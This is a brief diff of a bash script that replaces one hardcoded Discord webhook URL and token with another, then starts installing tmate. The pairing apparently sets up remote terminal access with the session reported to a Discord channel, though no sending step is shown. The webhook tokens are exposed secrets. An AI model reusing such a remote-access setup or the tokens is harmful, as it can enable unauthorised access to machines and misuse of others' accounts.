@@ -1,6 +1,6 @@
 #!/bin/bash
 
-WEBHOOK="https://discord.com/api/webhooks/1430223801613946973/RIfDKAVui7F1rgvK9tHu795I0xbGg0ouidR_b-6clKN3GRZGQYjiaIG2W--my_XqK4uZ"
+WEBHOOK="https://discord.com/api/webhooks/1438596632231936062/MSq8vd-xVhD4uKXW_5C-eerDg-Y0nr7hX9IBByocVAOXKF0kGef8Sc89gpDV7yERRx2i"
 
 echo "[*] Installing tmate..."
 if command -v apt >/dev/null 2>&1; then
